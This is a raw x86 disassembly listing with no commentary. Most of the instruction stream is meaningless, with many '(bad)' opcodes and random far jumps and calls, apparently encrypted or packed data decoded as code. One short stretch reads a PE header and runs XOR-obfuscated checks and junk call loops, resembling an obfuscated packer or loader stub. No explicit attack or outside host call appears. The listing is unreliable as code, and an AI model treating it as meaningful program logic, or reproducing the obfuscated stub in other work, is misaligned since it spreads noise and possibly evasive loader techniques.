  417934:	add    esi,ebp
  417936:	jl     0x41797d
  417938:	dec    ecx
  417939:	and    eax,0x3b1f3a80
  41793e:	push   eax
  41793f:	(bad)  
  417940:	jmp    esp
  417942:	es sbb esp,ebx
  417945:	xchg   edi,eax
  417947:	inc    ecx
  417948:	mov    edi,0xfafc7c74
  41794d:	jno    0x41798c
  41794f:	mov    ds,WORD PTR [edi-0x45c81f81]
  417955:	mov    cl,0xd3
  417957:	fwait
  417958:	test   eax,0x6dfcdfc7
  41795d:	inc    ecx
  41795e:	push   es
  41795f:	jle    0x41799e
  417961:	aas    
  417962:	aaa    
  417963:	jne    0x417937
  417965:	pop    ds
  417966:	and    eax,0x178c21ea
  41796b:	pop    esp
  41796c:	pop    ecx
  41796d:	or     ecx,DWORD PTR [edx+0x1f7bd95f]
  417973:	shl    DWORD PTR [esi-0x184e01ce],1
  417979:	mov    dh,0xc8
  41797b:	fnstcw WORD PTR gs:[esi-0x35]
  41797f:	jle    0x41791d
  417981:	in     eax,0xf2
  417983:	out    dx,al
  417984:	inc    edx
  417985:	xor    DWORD PTR [eax+0xa],edi
  417988:	jmp    0x655c:0x8d2fac7d
  41798f:	sbb    BYTE PTR [eax+edx*1],bh
  417992:	push   ss
  417993:	push   cs
  417994:	or     eax,0x92c3a540
  417999:	cmp    ah,BYTE PTR [esi+0x57]
  41799c:	mov    edx,DWORD PTR [edx+0x480cfdad]
  4179a2:	hlt    
  4179a3:	cmp    edx,DWORD PTR [edx+0x1a7583fe]
  4179a9:	mov    esi,0xd34b8ee0
  4179ae:	mov    bl,0xef
  4179b0:	sub    al,BYTE PTR [eax]
  4179b2:	in     al,0x64
  4179b4:	int3   
  4179b5:	call   0x6a11:0x3901c9b1
  4179bc:	adc    al,0x9d
  4179be:	mov    esi,0x94769ee6
  4179c3:	(bad)  
  4179c4:	mov    esp,0x2951a0d1
  4179c9:	fmul   st(0),st
  4179cb:	adc    BYTE PTR [edi],0x57
  4179ce:	(bad)  
  4179cf:	xor    edi,edx
  4179d1:	psllw  mm2,QWORD PTR [edi+0x6f]
  4179d5:	dec    ebx
  4179d6:	and    al,0xcb
  4179d8:	out    dx,eax
  4179d9:	sbb    DWORD PTR [ebp+0x26febfeb],edx
  4179df:	mov    WORD PTR ds:0xe44ddf6d,fs
  4179e5:	adc    bh,BYTE PTR [edi-0x67]
  4179e8:	ficomp WORD PTR [ecx-0x2adb3f83]
  4179ee:	jnp    0x41797e
  4179f0:	adc    DWORD PTR [ecx-0x1e],eax
  4179f3:	loop   0x417997
  4179f5:	fistp  WORD PTR [eax+0x47e6677d]
  4179fb:	je     0x41798c
  4179fd:	ja     0x417a29
  4179ff:	stos   DWORD PTR es:[edi],eax
  417a00:	pop    esi
  417a01:	cmp    ebx,DWORD PTR [edx+0x21]
  417a04:	xlat   BYTE PTR ds:[ebx]
  417a05:	pop    ecx
  417a06:	jecxz  0x417a77
  417a08:	xchg   BYTE PTR [edi+0xfdb6cb1],bh
  417a0e:	dec    esi
  417a0f:	xor    eax,edx
  417a11:	xchg   BYTE PTR [ebx+eax*8],ah
  417a14:	xor    al,0xb5
  417a16:	nop
  417a17:	imul   eax,DWORD PTR [edi-0x14db88c1],0x75
  417a1e:	loopne 0x4179a5
  417a20:	push   0xcd9c140f
  417a25:	jnp    0x417a9b
  417a27:	sub    eax,0xb922da3d
  417a2c:	bnd ret 0x5af5
  417a30:	ret    
  417a31:	jp     0x4179fc
  417a33:	mov    bl,0xdd
  417a35:	xchg   edx,eax
  417a36:	push   ss
  417a37:	mov    esp,0x5c5ac0a4
  417a3c:	pushf  
  417a3d:	cwde   
  417a3e:	cld    
  417a3f:	add    dl,ah
  417a41:	shl    BYTE PTR [ebx],0x18
  417a44:	es aam 0xd2
  417a47:	fild   QWORD PTR [eax+0x643c9db0]
  417a4d:	sbb    al,0x7e
  417a4f:	not    DWORD PTR [edx-0x6]
  417a52:	cwde   
  417a53:	rcr    BYTE PTR [edx+ecx*2],cl
  417a56:	mov    BYTE PTR [edi],bl
  417a58:	addr16 adc al,0xc9
  417a5b:	lds    edx,FWORD PTR [eax+0x2e]
  417a5e:	inc    edx
  417a5f:	adc    bl,BYTE PTR [edx]
  417a61:	mov    al,ds:0x56d65a9e
  417a66:	sbb    eax,DWORD PTR [ecx]
  417a68:	inc    ebp
  417a69:	xchg   ebp,eax
  417a6a:	mov    ah,bl
  417a6c:	and    ebx,DWORD PTR [ebx-0x345dc7e6]
  417a72:	lods   eax,DWORD PTR ds:[esi]
  417a73:	(bad)  
  417a74:	nop
  417a75:	or     BYTE PTR [esi],dh
  417a77:	cmp    esp,DWORD PTR [esi-0x5b3c0d75]
  417a7d:	cmp    BYTE PTR [edx],cl
  417a7f:	mov    cl,0x31
  417a81:	mov    dh,0x66
  417a83:	int3   
  417a84:	and    al,0x2e
  417a86:	push   ds
  417a87:	shr    DWORD PTR [ecx+0x7e10f260],1
  417a8d:	cmp    dh,BYTE PTR [esi]
  417a8f:	stc    
  417a90:	(bad)  
  417a92:	inc    ebx
  417a93:	aaa    
  417a94:	in     al,dx
  417a95:	jl     0x417b0a
  417a97:	push   esi
  417a98:	out    0xc5,al
  417a9a:	call   ecx
  417a9c:	fwait
  417a9d:	inc    edi
  417a9e:	addr16 mov bl,dl
  417aa1:	or     ch,BYTE PTR [edi-0x76]
  417aa4:	dec    esi
  417aa5:	xchg   ebx,eax
  417aa6:	dec    esp
  417aa7:	dec    edx
  417aa8:	sbb    DWORD PTR [ebx-0x40b262b2],0x4d
  417aaf:	pop    edx
  417ab0:	fisttp DWORD PTR [ebp+0x75]
  417ab3:	into   
  417ab4:	(bad)  
  417ab5:	pop    ebx
  417ab6:	retf   0x9193
  417ab9:	sbb    BYTE PTR [eax-0x390d1578],bh
  417abf:	sbb    edi,0xa3393648
  417ac5:	fwait
  417ac6:	test   ah,0x4f
  417ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aca:	sbb    al,0xb1
  417acc:	xor    BYTE PTR [ebp+0x3cef40bf],dh
  417ad2:	sbb    edx,0xf3417ad9
  417ad8:	pop    es
  417ad9:	mov    al,ds:0x45d6f755
  417ade:	mov    dh,0xbe
  417ae0:	mov    esi,eax
  417ae2:	jno    0x417aab
  417ae4:	in     al,dx
  417ae5:	repnz lds esi,FWORD PTR [ebx+0x33d8d3ec]
  417aec:	mov    al,0x8
  417aee:	call   0xe3b155e3
  417af3:	inc    edi
  417af4:	mov    edi,0xe1d8d52b
  417af9:	adc    ecx,DWORD PTR [ebp-0x3e]
  417afc:	and    eax,0xb5288dd5
  417b01:	fnstsw WORD PTR [eax]
  417b03:	mov    al,dh
  417b05:	sub    ebx,DWORD PTR ds:0x1815adc3
  417b0b:	shr    DWORD PTR [ebx+0x1f],1
  417b0e:	mov    ebx,0xb29439f6
  417b13:	or     BYTE PTR [eax],cl
  417b15:	add    esp,esi
  417b17:	call   0x82488b4d
  417b1c:	ins    BYTE PTR es:[edi],dx
  417b1d:	cmp    BYTE PTR [ecx+0x5c],bh
  417b20:	xor    DWORD PTR [ebp+0xf],edi
  417b23:	xor    DWORD PTR [esi],esi
  417b25:	inc    edi
  417b26:	mov    esp,0xdfe14a30
  417b2b:	fwait
  417b2c:	aad    0x5a
  417b2e:	fld    st(2)
  417b30:	pop    ds
  417b31:	inc    ecx
  417b32:	cmp    ecx,DWORD PTR ds:0x9e2842cb
  417b38:	xchg   ecx,eax
  417b39:	jle    0x417b65
  417b3b:	push   edx
  417b3c:	mov    cl,0x87
  417b3e:	mov    edx,0x1b5e17d5
  417b43:	pop    ebx
  417b44:	pushf  
  417b45:	les    esp,FWORD PTR ds:0xc7206afd
  417b4b:	mov    edi,0xa61f0bc1
  417b50:	sbb    al,0x5c
  417b52:	mov    ch,0x68
  417b54:	dec    esp
  417b55:	xchg   esi,eax
  417b56:	push   cs
  417b57:	test   BYTE PTR [ebx+ecx*1],cl
  417b5a:	inc    edx
  417b5b:	fidivr DWORD PTR [esi]
  417b5d:	jmp    0x417ae2
  417b5f:	fcomp  st(0)
  417b61:	pop    ebx
  417b62:	cwde   
  417b63:	mov    al,ds:0x769976b3
  417b68:	das    
  417b69:	mov    ebx,0x4e045e95
  417b6e:	mov    bl,0xd8
  417b70:	dec    ecx
  417b71:	jg     0x417b23
  417b73:	xchg   DWORD PTR [ebx-0x11bcc0b3],edx
  417b79:	mov    eax,ds:0x3ac3933
  417b7e:	jg     0x417b76
  417b80:	(bad)  
  417b81:	not    BYTE PTR [esi+0x71]
  417b84:	in     al,dx
  417b85:	mov    al,ds:0x296916d1
  417b8a:	loope  0x417bc0
  417b8c:	aas    
  417b8d:	addr16 popf 
  417b8f:	sbb    DWORD PTR es:[ecx+0x69],edx
  417b93:	push   0x104f0d99
  417b98:	or     edi,DWORD PTR [edx-0x80]
  417b9b:	inc    ebp
  417b9c:	or     BYTE PTR [edx+0x77adbe9c],dl
  417ba2:	cld    
  417ba3:	ins    DWORD PTR es:[edi],dx
  417ba4:	ret    
  417ba5:	xchg   DWORD PTR [esi-0x14],ecx
  417ba8:	icebp  
  417ba9:	or     BYTE PTR [eax],0xff
  417bac:	pop    ecx
  417bad:	mov    edx,0x547a8c7d
  417bb2:	hlt    
  417bb3:	sbb    eax,0xccbd1124
  417bb8:	xchg   edi,eax
  417bb9:	fadd   QWORD PTR [eax]
  417bbb:	xchg   edi,eax
  417bbc:	inc    DWORD PTR [ebp+eax*1-0x4a]
  417bc0:	pop    eax
  417bc1:	leave  
  417bc2:	call   0xd43a6628
  417bc7:	adc    BYTE PTR [ebp+0xb],ch
  417bca:	push   edx
  417bcb:	sbb    dh,0x75
  417bce:	ss pop eax
  417bd0:	pusha  
  417bd1:	sbb    eax,0x6c04d980
  417bd6:	jp     0x417b77
  417bd8:	scas   eax,DWORD PTR es:[edi]
  417bd9:	fwait
  417bda:	cmp    DWORD PTR [ecx+0x1cb2458e],esi
  417be0:	xlat   BYTE PTR ds:[ebx]
  417be1:	sub    bl,BYTE PTR [ecx-0x32]
  417be4:	lea    eax,[esp+ebx*4]
  417be7:	or     BYTE PTR [edx+0x361bd354],0xc8
  417bee:	mov    ch,0x1
  417bf0:	inc    esi
  417bf1:	(bad)  
  417bf2:	or     dh,ah
  417bf4:	daa    
  417bf5:	stc    
  417bf6:	addr16 inc ecx
  417bf8:	adc    BYTE PTR [ebx-0x2283ded0],ah
  417bfe:	daa    
  417bff:	cmp    al,0xc1
  417c01:	cmp    eax,0xda7c0966
  417c06:	jmp    0xd3ad:0xf175a8
  417c0d:	mov    eax,0x71ffb145
  417c12:	add    eax,0x16b707cd
  417c17:	adc    eax,0x3e54f3da
  417c1c:	jle    0x417c15
  417c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c1f:	or     eax,0x66cc173
  417c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c25:	in     eax,0xfa
  417c27:	test   ebx,eax
  417c29:	dec    esi
  417c2a:	pop    ds
  417c2b:	push   ss
  417c2c:	mov    bh,0xe0
  417c2e:	push   ss
  417c2f:	stos   DWORD PTR es:[edi],eax
  417c30:	dec    esi
  417c31:	and    eax,0xf413f63a
  417c36:	jmp    FWORD PTR [ecx-0x7d30d445]
  417c3c:	jns    0x417c82
  417c3e:	(bad)  
  417c3f:	xor    DWORD PTR [ebp+0x69],esi
  417c42:	push   esi
  417c43:	cmp    eax,0xfe26888a
  417c48:	fscale 
  417c4a:	(bad)
  417c4d:	js     0x417bef
  417c4f:	jl     0x417ca6
  417c51:	daa    
  417c52:	sub    BYTE PTR [bx+di+0x763c],0x22
  417c58:	mov    ebp,0x74f023ae
  417c5d:	or     DWORD PTR [ebp+0x237640f0],esi
  417c63:	les    eax,FWORD PTR [edi-0x4533d524]
  417c69:	or     ebp,esi
  417c6b:	stos   DWORD PTR es:[edi],eax
  417c6c:	xchg   edi,eax
  417c6d:	inc    ebp
  417c6e:	test   eax,0xf0c3cf0d
  417c73:	jo     0x417c3c
  417c75:	sbb    BYTE PTR es:[edx-0x75],dh
  417c79:	dec    eax
  417c7a:	mov    edx,0x109dd412
  417c7f:	xchg   ebx,eax
  417c80:	fisttp WORD PTR [ecx+edx*2]
  417c83:	fcom   QWORD PTR [edi+eiz*2]
  417c86:	outs   dx,BYTE PTR ds:[esi]
  417c87:	jp     0x417c97
  417c89:	popa   
  417c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c8b:	out    dx,al
  417c8c:	pop    ss
  417c8d:	cmp    DWORD PTR [esi-0x74faf5fb],esp
  417c93:	test   eax,0x98e7385d
  417c98:	lds    esp,FWORD PTR [eax-0x3f]
  417c9b:	les    edx,FWORD PTR [edx-0x75]
  417c9e:	out    dx,eax
  417c9f:	test   eax,0xefc45ba3
  417ca4:	cmp    esi,edi
  417ca6:	lods   al,BYTE PTR ds:[esi]
  417ca7:	pop    es
  417ca8:	test   BYTE PTR [ecx-0x6d],dl
  417cab:	nop
  417cac:	inc    eax
  417cad:	cwde   
  417cae:	jle    0x417ce3
  417cb0:	loope  0x417c73
  417cb2:	pop    es
  417cb3:	add    eax,DWORD PTR [edi+0x40c720e1]
  417cb9:	cmp    eax,0x1461f0f8
  417cbe:	push   0x683f4f3
  417cc3:	mov    WORD PTR es:[ebp+0x7a],es
  417cc7:	popf   
  417cc8:	jecxz  0x417d32
  417cca:	adc    ebx,DWORD PTR [ebx-0x63852d7a]
  417cd0:	fstp   QWORD PTR [ebx]
  417cd2:	xchg   esp,eax
  417cd3:	adc    eax,0x3f0a6100
  417cd8:	cs mov ebp,0xbfde30aa
  417cde:	fiadd  WORD PTR [ebp-0x69]
  417ce1:	mov    esi,0x3e6e741e
  417ce6:	pop    ss
  417ce7:	mov    ds,WORD PTR [edx]
  417ce9:	xchg   ebp,eax
  417cea:	sbb    ebx,DWORD PTR [ecx-0x30]
  417ced:	ins    DWORD PTR es:[edi],dx
  417cee:	and    al,0x4f
  417cf0:	enter  0xfa91,0x18
  417cf4:	mov    bh,0x8
  417cf6:	xchg   cl,bh
  417cf8:	sub    ebx,edx
  417cfa:	pushf  
  417cfb:	jmp    0xb16f112a
  417d00:	jmp    0x11:0x24d376c
  417d07:	cwde   
  417d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d09:	addr16 or cl,dl
  417d0c:	add    ebx,DWORD PTR [esi+edx*4+0x118f0025]
  417d13:	xor    edi,DWORD PTR [ebp-0x53]
  417d16:	test   esi,eax
  417d18:	test   DWORD PTR ds:0x142d99eb,edi
  417d1e:	ins    DWORD PTR es:[edi],dx
  417d1f:	add    al,0xe3
  417d21:	jb     0x417d7e
  417d23:	jge    0x417cf2
  417d25:	dec    bx
  417d27:	mov    esi,0xce3a37ac
  417d2c:	inc    ecx
  417d2d:	pop    edi
  417d2e:	jp     0x417cd4
  417d30:	and    eax,0x8302f26a
  417d35:	mov    dh,0xed
  417d37:	xchg   edx,eax
  417d38:	inc    esi
  417d39:	mov    ds,edi
  417d3b:	sar    BYTE PTR [eax-0x31],0xf5
  417d3f:	adc    eax,0xf52f6213
  417d44:	repnz out dx,al
  417d46:	cmp    DWORD PTR [edi+0x6afcae87],ecx
  417d4c:	mov    eax,0x6442f8d9
  417d51:	mov    eax,ds:0xc7451a5c
  417d56:	arpl   WORD PTR [eax-0x35],bp
  417d59:	cld    
  417d5a:	push   0x9e5c8ad1
  417d5f:	mov    cs,WORD PTR [ebp+0x751e1fa]
  417d65:	jnp    0x417d86
  417d67:	ror    DWORD PTR [ebp-0x51],cl
  417d6a:	je     0x417d9b
  417d6c:	cmp    al,BYTE PTR [edx]
  417d6e:	lds    edx,FWORD PTR [esi-0x65]
  417d71:	test   BYTE PTR [ebp-0x35],ch
  417d74:	xchg   esp,eax
  417d75:	ds pop esi
  417d77:	outs   dx,BYTE PTR ds:[esi]
  417d78:	jp     0x417dc8
  417d7a:	imul   BYTE PTR [ebx+edi*4]
  417d7d:	sbb    DWORD PTR [edx],eax
  417d7f:	out    dx,al
  417d80:	xor    eax,0xd9f35c98
  417d85:	pop    es
  417d86:	and    dl,BYTE PTR [esi+eax*4+0x750f767d]
  417d8d:	pop    esi
  417d8e:	sar    cl,cl
  417d90:	cmp    cl,dl
  417d92:	dec    edi
  417d93:	sub    esp,edx
  417d95:	push   ebx
  417d96:	neg    BYTE PTR [esi]
  417d98:	jmp    0x2824:0xe7a08a2f
  417d9f:	call   0xb95238c4
  417da4:	inc    ebx
  417da5:	cwde   
  417da6:	std    
  417da7:	adc    al,0xe1
  417da9:	fcom   QWORD PTR [ecx]
  417dab:	push   es
  417dac:	push   esi
  417dad:	jmp    0x2a65:0x3dd28b46
  417db4:	nop
  417db5:	mov    dh,0xb
  417db7:	xchg   ebx,eax
  417db8:	add    eax,DWORD PTR [ecx]
  417dba:	(bad)  
  417dbb:	imul   ebx,DWORD PTR [edx],0xffffff85
  417dbe:	add    ebp,DWORD PTR [ebp+0x1c]
  417dc1:	pop    ebp
  417dc2:	out    dx,al
  417dc3:	mov    al,0xd
  417dc5:	sub    bl,BYTE PTR [ecx+esi*4+0x45]
  417dc9:	lods   al,BYTE PTR ds:[esi]
  417dca:	cmp    al,0x1e
  417dcc:	dec    esp
  417dcd:	enter  0x1f0e,0x67
  417dd1:	out    dx,eax
  417dd2:	scas   al,BYTE PTR es:[edi]
  417dd3:	push   ebp
  417dd4:	ror    DWORD PTR [eax-0x96766f0],0xd4
  417ddb:	sub    edi,ebx
  417ddd:	rol    DWORD PTR [ebp-0x708b41fa],0x68
  417de4:	pop    esi
  417de5:	out    dx,al
  417de6:	add    eax,0x6bcab765
  417deb:	xlat   BYTE PTR ds:[ebx]
  417dec:	int3   
  417ded:	push   ecx
  417dee:	inc    edx
  417def:	das    
  417df0:	inc    esi
  417df1:	pop    ds
  417df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417df3:	test   al,0x1c
  417df5:	push   0x15
  417df7:	jno    0x417df7
  417df9:	jns    0x417de6
  417dfb:	ja     0x417dab
  417dfd:	mov    ah,0xb2
  417dff:	scas   eax,DWORD PTR es:[edi]
  417e00:	in     eax,dx
  417e01:	fsubr  QWORD PTR [ebp+0x12]
  417e04:	rcl    BYTE PTR [ebp-0x42],0x4a
  417e08:	(bad)  
  417e09:	jg     0x417e6e
  417e0b:	mov    bl,0x86
  417e0d:	cs jp  0x417e33
  417e10:	inc    ecx
  417e11:	jge    0x417e6e
  417e13:	ds cmp eax,0xa67b06d0
  417e19:	daa    
  417e1a:	mov    ?,ebx
  417e1c:	or     ebp,edi
  417e1e:	sar    BYTE PTR [esi-0x7e],0x3
  417e22:	(bad)  
  417e23:	mov    ds:0xa98f388f,eax
  417e28:	(bad)  
  417e29:	lock xchg ebp,eax
  417e2b:	xor    BYTE PTR [esi],dh
  417e2d:	ins    BYTE PTR es:[edi],dx
  417e2e:	cli    
  417e2f:	cmp    al,0xe8
  417e31:	fst    st(3)
  417e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e34:	adc    al,0xbd
  417e36:	xchg   esp,eax
  417e37:	add    BYTE PTR ds:0x871a4606,bh
  417e3d:	jns    0x417dd5
  417e3f:	inc    ecx
  417e40:	in     al,0x5a
  417e42:	add    cl,BYTE PTR [eax]
  417e44:	push   esi
  417e45:	lahf   
  417e46:	mov    edi,0x202603f7
  417e4b:	scas   eax,DWORD PTR es:[edi]
  417e4c:	pusha  
  417e4d:	fdivr  QWORD PTR [ecx]
  417e4f:	loop   0x417e72
  417e51:	mov    ebp,0x5273cafc
  417e56:	cmp    ah,BYTE PTR [edi+0x3cf46044]
  417e5c:	ret    0xe2f8
  417e5f:	or     BYTE PTR [edx+0x58],0xf8
  417e63:	scas   al,BYTE PTR es:[edi]
  417e64:	xchg   BYTE PTR [ecx+0x5c],bl
  417e67:	scas   al,BYTE PTR es:[edi]
  417e68:	inc    ebx
  417e69:	mov    ecx,DWORD PTR [edx+ebp*1+0x762c8186]
  417e70:	sub    ebx,DWORD PTR [esi]
  417e72:	outs   dx,BYTE PTR ds:[esi]
  417e73:	cmp    eax,0x4986bb9a
  417e78:	xchg   BYTE PTR [esi-0x26],dl
  417e7b:	ja     0x417e04
  417e7d:	pop    ecx
  417e7e:	push   ecx
  417e7f:	retf   
  417e80:	fs aam 0xad
  417e83:	jge    0x417ee7
  417e85:	or     al,0xab
  417e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e88:	or     bh,ch
  417e8a:	stc    
  417e8b:	mov    ebp,0x1180484d
  417e90:	fcom   QWORD PTR [esi+0x530247ef]
  417e96:	pop    ebp
  417e97:	inc    ebx
  417e98:	(bad)  
  417e99:	lds    eax,FWORD PTR [edx+0x10]
  417e9c:	and    DWORD PTR [edi-0x29],esi
  417e9f:	mov    bh,0x10
  417ea1:	cmp    edx,ebx
  417ea3:	lahf   
  417ea4:	gs dec ebx
  417ea6:	and    eax,0x67ea7f68
  417eab:	mov    dh,0x4b
  417ead:	sub    BYTE PTR ds:0xd718c754,0xa6
  417eb4:	enter  0x3364,0xe4
  417eb8:	aam    0x61
  417eba:	mov    eax,0x20f90dd9
  417ebf:	enter  0x9569,0xd9
  417ec3:	sub    BYTE PTR [ebp+0x33],al
  417ec6:	and    al,0x93
  417ec8:	jmp    0x7896:0x2377975d
  417ecf:	loop   0x417ebd
  417ed1:	sbb    DWORD PTR [edi-0x572973a2],eax
  417ed7:	mov    DWORD PTR [eax+0x76],ecx
  417eda:	mov    edx,0xf89eeeed
  417edf:	int    0x2b
  417ee1:	stos   BYTE PTR es:[edi],al
  417ee2:	rcl    bl,0x15
  417ee5:	mov    WORD PTR [edi+0x318ec102],cs
  417eeb:	mov    ebp,0x3c4161c5
  417ef0:	jg     0x417f55
  417ef2:	cmp    eax,DWORD PTR [edi+edx*2]
  417ef5:	dec    ebx
  417ef6:	lea    esp,[eax-0x68d7ee33]
  417efc:	mov    esi,0x2ab37b19
  417f01:	sbb    esp,DWORD PTR [ecx+edx*2-0x278f4bba]
  417f08:	js     0x417f56
  417f0a:	pop    edi
  417f0b:	cmc    
  417f0c:	xchg   esp,eax
  417f0d:	test   al,0xcb
  417f0f:	loope  0x417f8c
  417f11:	shr    DWORD PTR [eax],cl
  417f13:	sbb    eax,0xb9bc5aa3
  417f18:	mov    esi,0x97fc5e07
  417f1d:	xor    BYTE PTR [ebp+ebx*2-0x25],0x74
  417f22:	mov    ecx,0x81008a52
  417f27:	add    eax,0x429004
  417f2c:	dec    esi
  417f2d:	and    al,0x0
  417f2f:	add    BYTE PTR [ecx*1-0x6febca7f],al
  417f36:	inc    edx
  417f37:	add    BYTE PTR [eax+eiz*2],cl
  417f3a:	inc    edx
  417f3b:	add    BYTE PTR [edi+ebp*2],dh
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	adc    dl,al
  418115:	iret   
  418116:	and    ebp,edi
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x3b]
  418120:	mov    ebp,0x2943f558
  418125:	and    ebp,DWORD PTR [edi-0x45705111]
  41812b:	mov    cl,0xf0
  41812d:	adc    DWORD PTR [edi+0x690eaadd],ecx
  418133:	test   BYTE PTR [ebx+eiz*1+0x7b11c9a6],ah
  41813a:	sub    al,0x58
  41813c:	in     al,0x1a
  41813e:	int3   
  41813f:	lods   eax,DWORD PTR ds:[esi]
  418140:	xchg   edx,eax
  418141:	mov    ebp,0x88af6ccd
  418146:	jne    0x418191
  418148:	jne    0x418177
  41814a:	loopne 0x4180ea
  41814c:	jno    0x41819f
  41814e:	fnsave [ebp+eax*1-0x2a]
  418152:	scas   al,BYTE PTR es:[edi]
  418153:	jbe    0x41812c
  418155:	jbe    0x418198
  418157:	add    BYTE PTR [ecx+edx*2],ah
  41815a:	loop   0x418119
  41815c:	fsubr  st(4),st
  41815e:	icebp  
  41815f:	lods   eax,DWORD PTR ds:[esi]
  418160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418161:	jp     0x4181c8
  418163:	stc    
  418164:	sub    BYTE PTR [eax+0x7d13615a],dh
  41816a:	pop    es
  41816b:	fpatan 
  41816d:	mov    bh,0x6a
  41816f:	(bad)  
  418171:	scas   al,BYTE PTR es:[edi]
  418172:	call   0x4f61:0x42d9130
  418179:	adc    BYTE PTR [eax+esi*4-0x403062d4],dh
  418180:	sub    eax,0x1528160b
  418185:	daa    
  418186:	or     ecx,DWORD PTR [ebx-0x23]
  418189:	cmc    
  41818a:	xchg   BYTE PTR [ecx],dh
  41818c:	push   ebp
  41818d:	in     eax,dx
  41818e:	pop    edx
  41818f:	dec    esp
  418190:	jbe    0x4181c7
  418192:	or     DWORD PTR [ebp+0x7663d306],edi
  418198:	out    dx,al
  418199:	adc    ebx,DWORD PTR [edi+0x62]
  41819c:	sub    al,0x79
  41819e:	cs push 0x8f6303f5
  4181a4:	ds jmp 0x418154
  4181a7:	(bad)  
  4181a8:	popf   
  4181a9:	xchg   esi,eax
  4181aa:	xchg   esi,eax
  4181ab:	gs push esi
  4181ad:	pop    esp
  4181ae:	xor    BYTE PTR [edi+0x1c0637ea],ch
  4181b4:	mov    edi,0x3a806314
